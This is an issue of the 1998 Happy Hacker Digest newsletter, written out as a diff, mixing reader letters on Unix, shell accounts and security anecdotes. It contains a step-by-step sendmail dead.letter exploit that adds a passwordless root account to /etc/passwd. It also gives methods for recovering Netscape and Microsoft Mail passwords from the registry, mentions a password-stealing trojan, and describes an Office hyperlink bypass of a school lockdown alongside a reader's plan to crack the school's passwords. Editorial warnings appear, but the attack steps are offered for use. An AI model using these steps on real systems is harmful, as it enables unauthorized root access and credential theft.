@@ -1,0 +1,684 @@
+May 18, 1998
+
+=====================================================================
+URL of the day: http://www.cert.org Computer Emergency Response Team
+See back issues of the Happy Hacker Digest and Guides to (mostly)
+Harmless Hacking at http://www.Happyhacker.org.
+GTMHH en espanol: http://underhack.islatortuga.com
+Svenska:http://w1.340.telia.com/~u34002171/hhd/gtmhh/svenska/hhdsvensk.html
+=====================================================================
+
+TABLE OF CONTENTS
+
+New Editor of HH Digest
+sendmail Deadletter exploit
+UNIX file permissions clarification
+UNIX Books
+Password Humor
+More Free Shell Accounts
+Foiling Portscanners with netcat
+Batch File daemons
+Mail Bomb Revenge
+Microsoft Office Vulnerablilty
+Netscape/IE password vulnerablilities
+Korn Shell under Windows 95/NT
+JavaScript Preferences
+Batch files run as CGI???
+What to do when you are attacked by crackers
+
+====================================================================
+New Editor of HH Digest
+====================================================================
+We have a new Editor-in-Chief for Happy Hacker: Dale Holmes. He's a
+computer consultant doing large scale system deployments for Fortune
+1000 companies and a published author, having written "MCSE Test Prep:
+Windows 95," both the first and second edition (publisher: QUE), and "MCSE
+Training Guide:Windows 95," second edition (publisher: New Riders). 
+Dale Holmes will be assisted by a number of other volunteers, all of
+whom also have good qualifications.
+
+We are happy to report that our past editor, R.J. Gosselin, plans to
+continue writing for the Happy Hacker mailing list, and is a member of
+the nonprofit Happy Hacker Board of Directors.
+
+====================================================================
+Sendmail Deadletter exploit
+====================================================================
+>From anonymous:
+
+Hey Carolyn,
+Today I may have done a crime! What I did was to explore a security hole
+in my free BSD shell account. Called dead.letter, you probably know what
+it is =).
+
+Anyway I used the dead.letter to get a root shell. It worked!!
+I logged off, then I wrote an email to root at the server and told them
+all about it, and asked them to fix it. I never logged into my root
+shell 'cos I could mess something up!! How do you think they will take it? I
+actually forgot to ask for permissions to try it out =( But at least I didn't
+do any harm at all, I didn't become root either! Please let me know !
+
+--------------------The exploit-------------------->
+Deadletter Exploit for Sendmail 8.8.4 
+Version affected: 8.8.4
+
+Ok, here's a brief and interesting explonation of this famous exploit. 
+This exploit uses sendmail version 8.8.4 and it requires that you have a
+shell acount on the server in question. The exploit creates a link from
+/etc/passwd to /var/tmp/dead.letter Very simple really. Here's how it 
+works, below are the exact commands as you have to type them.
+
+ln /etc/passwd /var/tmp/dead.letter 
+telnet target.host 25 
+helo <domain-name> mail from: frostiez@bah-bah.net 
+rcpt to: masterbah@hotmail.com 
+data
+frostiez::0:0:Mr Frostiez:/root:/bin/bash
+.
+quit
+
+Then, you're done, telnet to port 23 and log in as frostiez, no
+password required. Thanx to a little bit of work we did, frostiez
+just happens to have the same priviledges as root. 
+There are a couple of reasons why this might not work:
+
+1) /var and / are different partitions (as you already know, you can't
+make hard links between different partitions).
+2) There is a postmaster account on a machine or mail alias, in which
+case, your mail will end up there instead of being written to a etc/passwd.
+3) /var/tmp doesn't exist or isn't publicly writable.
+
+--------------end of exploit--------------------->
+====================================================================
+UNIX file permissions clarification
+====================================================================
+From:Joseph Shraibman<jks2557@is4.nyu.edu>
+On Wed, 6 May 1998, Carolyn Meinel wrote:>
+>==================================================================
+>	*** Shell Programming File Permissions
+>==================================================================
+>From: "Mike Miller" <mike-miller@geocities.com&gt>
+>chmod 777 sets permissions for all users to read, write, and execute a
+>file/directory (execute a directory means to change to it).
+
+That's write permission. Execute permission (on a directory) means to
+go through it. For example, if your home directory is +x but -rw then
+people can view your .plan and any other file you leave world readable (like
+your .history if you aren't careful) but not get a listing of files in said 
+directory.
+
+Joseph Shraibman a.k.a. TuPari
+http://pages.nyu.edu/~jks2557
+
+====================================================================
+UNIX Books
+====================================================================
+From: "Tim McCann" <tim@canberra.starway.net.au> 
+Learning Unix
+
+I'm not sure if you've mentioned this book before, but I found it
+today, It is called "Learning the Unix os" and is published by O'Reilly
+(the nutshell people), I picked it up for $19.95 Australian and it has 
+so far proved to be a pearler. Once more thanks for providing a great
+service.
+
+TTFN Tim
+
+====================================================================
+Password Humor
+====================================================================
+From: Nev Dull <nev@bostic.com> 
+Forwarded-by: Victor the Cleaner <jonathan@canuck.com>From: "Kevin 'Bob' Fu" <fubob@mit.edu>
+Lecturers often give computer demos during large lectures. One lecturer
+recently muttered this while logging in to our campus-wide system:
+Lecturer: "Wrong password? ... Hmmm, Oh! Wrong daughter."
+
+====================================================================
+More Free Shell Accounts
+====================================================================
+From: "Tom Piccin" <tom.piccin@lineone.net> 
+Dear Carolyn,
+I bet you get countless emails asking you to post messages in the
+Digests about where you can get FREE shell accounts but I found a
+great one!
+Seriously, this account could not be better if you payed for it! It
+has all the tools you outlined in your "Meinel Hall of fame Internet Exploration
+tools" and it is simply *perfect* for all us budding harmless hackers to
+learn unix on.
+
+They offer:
+- 2 MB of storage space (for normal files, programs)
+- Unlimited Telnet access.- ssh (secure shell).
+- Access to widely used UNIX programs (C/C++ compilers, Perl,
+FTP,finger, whois, nslookup, etc. Other programs will be added at user's
+requests,
+subject to administrator's review).- Your choice of shell: bash, csh or sh
+- Your own email address.
+
+Here are the details for the readers of the digest should you decide to
+include this:
+
+Go to the webfreaks hompage (www.webfreaks.com) and once you are there,
+click on the link that says "Internet Junk". Once the page has loaded
+up go to "free unix shell account" to register for your account. It takes 24
+hours for them to get it up and running for you.
+I love the guides and the digests! Keep up the good work! Thanks again
+:-)
+Tom Piccin
+====================================================================
+From: "Mortimer, Steve" <steve.mortimer@eds.com>
+
+Hello There.
+
+Just a quick note, have you checked out www.hackers.com ?
+
+They have a really good archive of tools and a very well put together
+neophytes section, which unsurprisingly enough contains most (if not
+all) of the issues of the GTMHH and your beginners guide.
+
+Something you might want to include in one of you publications:
+I live in the UK which is _ALL_ the paranoid about Crackers. However,
+for those interested in the Hackerscene then there is an ISP in the UK
+called Direct Connection (www.dircon.co.uk) who will provide a full
+featured Unix Shell account with e-mail, IRC, Newsgroup, Telnet, BASH
+and several other shells and Unix based web browsers (no PPP).
+The prices are very reasonable and their connect number is charged at a
+local rate. I pay #20/Month for a TCP/IP and Unix Shell, I think the
+Shell Acc is about #10 - #12/Month by itself.
+
+Just thought you might be interested.
+
+One last thing, the mailing list is very good. I really enjoy reading
+your publications. Keep up the good work.
+
+====================================================================
+From:"Chris Keogh" <smelly_feet@hotmail.com>
+At 11:52 PM 5/8/98 PDT, you wrote:
+>Ok, so could you tell me how to get a guest shell account at a server 
+>that will give them out without talking over the phone (where i live, 
+>there are no isp's that support shell accounts).. i've been looking all 
+>over the web and it's hard to find a place that says "yes, we give guest 
+>shell accounts".. help?
+
+See http://www.celestin.com/pocia for listings of ISPs around the world,
+many of whom advertise shell accounts. All you need is a PPP connection
+(the kind you use for access to the Web) and you can telnet into a shell
+account anywhere on the Internet.
+
+====================================================================
+Foiling Portscanners with netcat
+====================================================================
+[Dale: A utility called netcat has been ported to Windows 95/NT by
+Weld Pond of the L0pht. It is a very useful tool. It can be downloaded from
+the web
+site at www.l0pht.com. If you have never been there before, notice that
+that it is spelled L, zero, P, H, T.
+
+Here is an example command line, from Athanasios Paloukis, for using
+netcat to send a text file to a port whenever a connection is made there.
+This will send port scanners a humorous (or not so humorous, depending on your
+mood) message whenever they attempt to scan your machine for open ports.
+
+Keep in mind that netcat using this example with well known ports will
+render useless the service that used to be using that port (until netcat is
+no longer bound to that port). This happens because Windows NT allows for netcat
+to bind in front of another service on a port that is in use (not sure if this
+works under 95).]
+
+From: "Athanasios Paloukis" <athan@dial.pipex.com>
+nc -l -p 12 <send.txt
+
+If someone is doing port scan (at the port 12) then this is what he
+will get - the contents of send.txt.
+
+We can also have the netcat run minimized. [Dale: This makes it behave
+like a daemon]
+
+====================================================================
+Batch File daemons
+====================================================================
+From: Harlan Carvey <keydet89@yahoo.com>
+
+Carolyn,
+
+After writing the batch file programming file, I came
+up with an interesting idea... this might be good for
+folks with small win95 networks... write a pseudo-syslog
+daemon for file accesses.
+
+Create a batch file called batlog.bat (or whatever).
+That file should contain the following lines:
+@echo off
+echo %1 >files.log
+notepad %1
+
+This batch file simply takes the name of the file
+when you double-click on a text file, and sends it
+to the log file before opening the file in Notepad.
+
+Click My Computer ->View ->Options... ->File Types 
+->Text Document. 
+Choose Edit ->Open (in the Actions: box) ->Edit.
+Change notepad.exe to the name of your batch file.
+
+Other information can be added...check out the web 
+sites I provided in the Batch File Programming text for
+information on how to include date/time, etc. With 
+the addition of Un*x-style programs written for DOS,
+one can create quite a few neat little tools...
+Carv
+
+====================================================================
+Mail Bomb Revenge [Sort of...]
+====================================================================
+From: John <flamingdog@yahoo.com>
+
+Easy, Legal E-mail Bomb Revenge
+
+This is a rather harmful, but still legal and effective way of
+deterring e-mail bombers.
+
+Most e-mail servers like Yahoo and Hotmail have options for automatic
+responses or vacation alerts that automatically send messages to
+whoever sends you mail. All you have to do is configure your account
+for this (check the options and help files in your account for proper
+instructions).
+
+Now lets suppose you got bombed with 300 messages, whoever bombed you
+would get 300 back! And how about those bombers that send them from
+fake adresses. To do that, some bombers actually create the email
+address on the bombers computer temporarily. Now when they get the
+responses from the bombs, their computer will crash from the load of
+junk they are getting!
+Hope this was helpful
+-John (aka LOSER_138)
+
+[Dale: Keep in mind that this method sends a message to EVERYONE who
+sends you mail... If you receive messages from a listserv that puts the LIST
+address in the From and/or Reply-to fields, you will be sending a message to the
+list every time you receive a message from the list. Of course, that message
+will go to everyone on the list - including you. Having just received
+a new message (your own message) from the list, your email system will
+generate another response to the list, which will be sent to everyone on the
+list - including you. This will force another response to go out to the list...
+and so on, and so on, ad nauseum. This will be very annoying to EVERYONE on
+the list, and you might even be accused of SPAMMING the list. In case you
+don't know - spamming is a VERY BAD THING! The moral of this story - be 
+careful how you use an auto-reply function.
+
+I am told that you can set your mail priority to "junk" on your
+autoresponder in order to avoid this problem, but I have not tried it myself...]
+
+====================================================================
+Microsoft Office Vulnerablilty
+====================================================================
+From: PeteFulton <PeteFulton@aol.com>
+This is in response to some file you put together on hacking into Win95.
+You have covered all the easy stuff that anyone that can spell "hack"
+has already figured out. You mentioned all the ways if there are no real 
+security blocks.
+
+At my school they have some program (at this point we don't know anything
+about it) that has every possible way to break in blocked. Luckily we all
+get our own little name and password so we can type some files and learn how
+to do easy stuff (the class is Computers A, it is so basic; we are learning
+how to save files). Now, I know a little stuff about computers and I know
+that they have thought of everything.
+
+1. All function keys are off during startup
+2. No bootup disk option
+3. All good programs are blocked except MSWORD and NETSCAPE.
+4. Right click is turned off.
+5. Access to the A:\ blocked.
+6. Saving files anywhere but to your own drive (H:\) is blocked.
+
+This left me and my hacking friends with a little dilemma, and we thought
+the bad administrators had one. I should've had more faith in myself:
+
+WHAT I DID 
+I went into Microsoft WORD, and started messin around with HTML. I
+quickly learned that WORD doesn't understand HTML but it does understand links
+(hyperlinks).
+
+I had:
+
+{<a href="file:///c:windows/winipcfg.exe">WINIPCFG</a>}
+
+written in and then I looked up and saw that
+file:///c:/windows/winipcfg.exe had turned into a nice blue link. I
+immediately clicked on it not expecting any nice results due to previous
+experiences. Much to my surprise, a
+box came up with title Microsoft Office (my first hint it would work) and asked
+me if I wanted to run the specified file. I clicked okay and sure enough
+WINIPCFG.EXE
+came up on my screen.
+
+WHY
+I think this worked because the school forgot (or didn't know) to
+block the Microsoft office browser (for lack of a better term).
+
+MY POINT
+Many systems actually take some talent to hack. This system had one
+flaw, you might not be so lucky. Now I can get into anything on the computer or
+even run stuff off my disk. I wanted to run WINIPCFG.EXE so badly because
+it gives the computer's IP address. Now I have distributed that and we plan to
+get some password files and crack our way into the system.
+
+Feel free to use any part of this letter in posting or BBS or whatever. I
+wrote this to tell you that I was dissapointed in the file I read. I came
+across it looking for a way to hack an IBM compatible server (the one I just
+got). If you know anything please mail me.
+
+PeteFulton@aol.com
+later.
+-Pete
+
+[Dale: Pete, It looks like your system administrators have used the System
+Policy
+editor (and wisely so...) to give them administrative control over their
+Windows 95 systems. System Policies give an administrator the ability to "lock
+down" the Windows 95 desktop, limiting access to Windows 95 utilities, Programs
+installed on the computer, Drives on the computer, Desktop appearance, etc.
+
+System Policies are implemted and edited using the POLEDIT.EXE
+utility. I suggest you read all about it in the WIndows 95 Resource
+Kit.
+
+The exploit you describe involving MS Office is known to Microsoft.
+They issued a warning about it some time ago, but I have been unable
+to find it in my archives.
+
+WINIPCFG.EXE will give you the IP address of the machine, as well as
+some other useful information, like the DNS server IP address, or the WINS
+server
+IP address, as well as the hardware address (or MAC address) for the
+machine.
+
+As for cracking your way into the system, I suggest you think carefully
+before you act. If your system administrators tell you thatit is OK to
+experiment with the system, then you may be alright, but given the level of
+control they have implemented in the System
+Policies, it seems unlikely that they will agree to let you crack the
+system. Most schools and Universities find that they are constantly under
+attack from crackers and take the matter VERY seriously. You could find
+yourself in some serious trouble, including academic probation, expulsion,
+or even criminal prosecution if you get caught
+even attempting unsuccessfully to break into the system.
+
+You say that you know a little about computers; I think your time might be
+better spent learning more about computers rather than breaking into them.
+You may find that once you know all the nitty-gritty details of a computer
+operating system, breaking into one
+holds little intrigue...]
+
+====================================================================
+Netscape/IE password vulnerablilities
+====================================================================
+acidburn151@juno.com
+
+How to hack a Netscape E-Mail Password
+--------------------------------------By -=MoD=-
+The E-Mail password encryption of the "remembered password" is really 
+weak. I've been able to crypt-analyse it in about 20 minutes. There are
+two methods to break a password you've got: The Non-Coders one, and the
+Coders one.
+
+I tested this method only with my (oldie) Netscape Navigator 3.01 Gold, 
+but I'm sure it would work with NS2.0, even with 16bit versions. I'm
+still investigating for those possibilities.
+
+!!! And for those who think Internet Explorer is safer !!!
+!!! read the last section !!!
+
+[Dale: After all the security alerts that have been posted regarding
+IE, I don't think there are many who think that IE is safe...]
+
+The password can be found in the registry at:
+
+HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\Mail\POP Password
+
+About the encryption 
+The encryption is done that way:
+1. Pass the password through an XOR key;
+2. MIME encode it.
+
+To decode, you simply reverse the operation (really! ;)
+
+Non-Coder Method:
+
+Material needed:
+-Netscape Navigator installed on your computer
+-A port listener/dumper
+-A password!
+
+What to do:
+-Go in the registry. Set the POP Password to the password
+you want to hack.
+-Also in the registry, set the POP Server to 127.0.0.1
+(HKEY_CURRENT_USER\Software\Netscape\NetscapeNavigator\Services\POP_Server)
+-Start your port listener/dumper on port 110 (POP3)
+-Go in Netscape and click "Get Mail"
+-Return to your listener. Once you're connected, type "+ok"
+followed by enter until you've got "pass xxxxxxxx" (where xxxxxxx will
+be the
+decrypted pass!)
+
+Coderz Method:
+Material needed:
+-You're favorite programming language (I guess qbasic would do
+anyway.. ;)
+-A MIME64 decoder
+-A password!
+
+What to do:
+-Decode the password as a MIME64 string
+-XOR the password with the MIME64 encoded string found at the
+end of this document. And you've got you're little password...
+
+P.S.: The key at the end of the document must be "XOR 48" to be valid.
+I've got it entering a "0000000000000 ..." password and I'm too
+lazy to remove this mask.. ;)
+
+So the decryption routine would do something like:
+for (c=0;pass[c] != '\0'; c++) 
+pass[c] = pass[c] %netscapekey[c];
+or
+for c := 1 to length(pass) 
+do pass[c] := char(byte(pass[c]) XOR netscapekey[c]);
+
+What to do with that crap:
+
+I've coded a prototype of "trojan portscanner" which sends me the
+password of the user via E-Mail when he runs the program, and it work very
+well!
+
+The possibilities are almost infinite! The majority of the EMail
+Accounts are Internet Accounts too, so imagine what bad hackers could do!
+
+Microsoft Safer?
+If you are a Microsoft addicted user, look at this. The hacking of a
+Microsoft Mail 4.70 Password is almost the samething as the netscape 
+one, except anybody can do it with an MIME64 decoder!
+
+Microsoft Mail stores the password like this:
+HKEY_CURRENT_USER\Software\Microsoft\Internet Mail and News\Mail\POP3
+
+There is a sub-key created in this path, with the name of the POP3 
+account. In example, if I put "localhost" as POP server, I'll have:
+HKEY_CURRENT_USER\Software\...\Mail\POP3\localhost
+
+And in this path, we'll have an entry named password. Save the value of
+this password to a file, then MIME64 decode it. You have your RAW
+password!!! Microsoft engineers are lazier than Netscape ones. They don't even 
+encrypt passwords in the registry.
+
+People say: "Internet is secure".
+I say: "Internet will be unsecure for... a long time!"
+
+"Enjoy the professional engineering, friends!"
+-the.avatar
+
+====================================================================
+Korn Shell under Windows 95/NT
+====================================================================
+From:David Bremner<dbremner@usa.net>
+ATResearch has a Unix emulator available. It's free for evaluation
+purposes. The URL is: http://www.research.att.com/sw/tools/uwin/ Sincerely,
+David Bremner
+
+[Carolyn: I believe this is significant news. Installing Linux is
+a pain.]
+
+[Dale: This is a cool tool! I have installed it under Windows NT. It
+behaves like a command prompt session, but it is a functioning Korn Shell. It
+supports about 160 UN*X commands! You can Alt-Tab to it from other Windows
+programs. It is a great way for a Windows user to get familiar with the UN*X
+shell
+without having to go through all the pain of partitioning their hard drive,
+and installing another OS - not to mention configuring a boot loader...]
+
+====================================================================
+JavaScript Preferences
+====================================================================
+From: "Neal" <winky@wf.quik.com> 
+I have been reading the GTMHH for about 3 months now, lots of good info.
+The reason for this letter is that I recently was very agitated at a
+web site I went to on Virtual Places (chat). The site was java script password
+protected (hahaha), and without the password would not let you do anything but
+reset the computer (real pisser). I messed with a few things for about 30
+min. and it hit me that I had saw where you can turn off java script in
+Netscape, so I did. Went back to that URL and after it loaded I hit "view
+source"
+from the pulldown on netscape.
+
+There was password right there in front of me, and I haven't even
+messed with java at all, but could tell what it was. The funny part is
+I went to that site again on VP, used the PW and got in, of course. The owner
+was there, so I asked him "Who is Rachel" (I love "Rachel" being the
+password). 
+It was too funny; here he thought his site was secure, and to top it
+off all that was there was links to some other VP sites that were not PW
+protected (go fig).
+I thought I'd tell ya this story just to keep you up on some of the
+stuff so called hackers of chat sites do. Most don't even know what UN*X is
+much less what they are actually doing in the first place.(hahaha)
+
+Unfortunatly I don't have a shell account or a UN*X system, but I'm
+still reading up on it. Keep up the good work.
+-L O N E S T A R-
+
+====================================================================
+Batch files run as CGI???
+====================================================================
+From:bigtoe <bigtoe@hardlink.com>
+
+Here is another problem: Can batch files be run like CGI? I don't see
+why they can't, but I'm no webmaster. It would be interesting.
+This could actually be useful (maybe), for sysops who don't want to
+leave the telnet port open, but keep their eyes on net traffic, and other
+aspects. I mean the fewer services you offer, the safer your box, and
+we all know that sniffers can smash security like nobody's business. No
+hacker watches the web port though. It's almost always secure. I dunno.
+
+--HOrrorshow
+
+[Dale: No open port is secure...]
+
+====================================================================
+Phone Scam?
+====================================================================
+
+Recently there has been a rise on phone scams. The latest is: 
+An individual calls identifying himself as an ATService Technician
+running a test on telephone lines. He states that to complete the test you
+should touch nine(9), zero(0), pound sign (#) and hang up. This gives the
+individual that called you access to your telephone line and allows them to
+place a long
+distance call with the charge appearing on your telephone bill. This has
+been verified with UCB Telecomm and the police department.
+
+Please be aware and do not press 90# for anyone. This is for both
+business and home phones.
+
+====================================================================
+What to do when you are attacked by crackers
+====================================================================
+From: Grifter Guy <grifter4u@yahoo.com>
+
+I have a cablemodem and one IP address. Great fast access, but I don't
+want my kids using my system; plus more toys were required. Its a man
+thing, we need toys.
+
+We installed a Slackware (very recent version) 
+Linux system with IP masquerading and connected it to the existing
+Novell network. Run IP on the Win95 workstations and you got Internet
+access where required. The Linux system also has the usual modules
+loaded, SMTP, Telnet, Apache, DNS, and FTP.
+
+I registered a domain against my one IP address and setup my secondary
+DNS on another Linux system without asking the owner first. Yeah I am
+bad, but I moved the secondary DNS to another system where I did have
+permission. I have some web pages but nothing done with `cgi' use.
+
+I get a constant stream of hack attempts against the Linux box. 
+Everything is logged and I review all the logs once a month just to
+check what is going on. the Linux box is now a secondary MX
+destination for a couple of other domains so if I hear a lot of hard
+drive activity I will check the logs to determine what is happening
+and will alert the other domains if I see a problem. The Linux box is
+up 100% of the time.
+
+At first the hack/crack attempts against the box were humorous. 
+Sometimes the logs show IP numbers and sometimes DNS style ID that
+even gives you dial-in port number of the terminal server where they
+gain access. At first I thought it was too much trouble to do
+anything about the attempts except ignore them. Recently I was
+involved (in a minor way) in tracking down the source of an Email death
+threat against Bill Gates. The cops were ready to use the SWAT squad,
+if necessary, over a real corny message.
+
+At this point there is the realization that the SWAT squad could show
+up at my door and I would be the subject of hasslement if a hacker
+sucessfully used my system for harmless mischief. I know how to find
+the upstream providers and I know how to get the attention of the ISPs
+involved.
+
+Should I pursue a complaint against every attempt and possibly get
+these people bounced from their ISPs? Most of the attempts I see have
+no possibilibity of sucess. I use non-dictionary passwords on all
+accounts, particularly root. We have setup the Linux box to forward
+all mail to a Mercury gateway on the Novell server and we deleted most
+of the user accounts on the Linux box. I offend no one through my
+domain name so no one is out to get me.
+
+I would prefer to ignore the hack/crack attempts and use my time on
+things I like to do. Chasing down every attempt would eat up a bunch
+of time and I don't know what the results would be. Should I ignore
+the attempts or make someone's life Hell?
+
+[Dale: Depending on what was done and how your system was used to
+accomplish it, you might have some legal responsibility if your system is
+used in an
+attack. I would tend to pay close attention to your logs, and keep them around
+for a while (or archive them to tape...). If your machine is successfully
+cracked it could become the resting place for somebody with really malicious
+intentions. A LINUX box with a nice fat pipe to the 'Net would be a great place
+for ablack hat to do his/her dirty work. I would suggest that you at least
+pass on your logs to the ISP of the attacker, and let them handle it from
+there. This is just my personal opinion. It is a pain, but sometimes you
+gotta do what you gotta do...]
+
+__________________________________________________________________
+
+with message "subscribe hh." 
+This is a list devoted to *legal* hacking! If you plan to use any
+information in this Digest or at our Web site to commit crime, go away!
+Foo on you! Happy Hacker is a 501 (c) (3) tax exempt organization in the
+United States operating under Shepherd's Fold Ministries. Yes! This is
+all a plot to save your immortal souls!
+For Windows questions, please write Dale Holmes <editor@techbroker.com>; for
+Macs, write Strider <Strider@clarityconnect.com>; and Unix, Carolyn Meinel
+<>. Other general questions go to Carolyn Meinel
+<>.
+Happy Hacker email list maintainer: "Jonathan D. Zerulik" <jdz@ufl.edu>
+Editor: Dale Holmes <editor@techbroker.com>
